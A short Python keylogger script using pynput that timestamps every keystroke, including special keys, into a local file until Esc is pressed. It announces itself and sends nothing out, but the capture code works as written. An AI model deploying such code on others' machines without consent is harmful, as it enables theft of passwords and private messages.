from pynput import keyboard
import datetime

log_file = "key_log.txt"

def on_press(key):
    try:
        # Log alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key.char}\n")
    except AttributeError:
        # Log special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(f"{datetime.datetime.now()} - [SPACE]\n")
            elif key == keyboard.Key.enter:
                f.write(f"{datetime.datetime.now()} - [ENTER]\n")
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                f.write(f"{datetime.datetime.now()} - [SHIFT]\n")
            elif key == keyboard.Key.backspace:
                f.write(f"{datetime.datetime.now()} - [BACKSPACE]\n")
            # Add more special keys as needed
            else:
                f.write(f"{datetime.datetime.now()} - [{str(key)}]\n")

def on_release(key):
    if key == keyboard.Key.esc: # Stop listener with Esc key
        return False

print("Starting keylogger... Press ESC to stop.")
# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keylogger stopped. Logs saved to {log_file}")
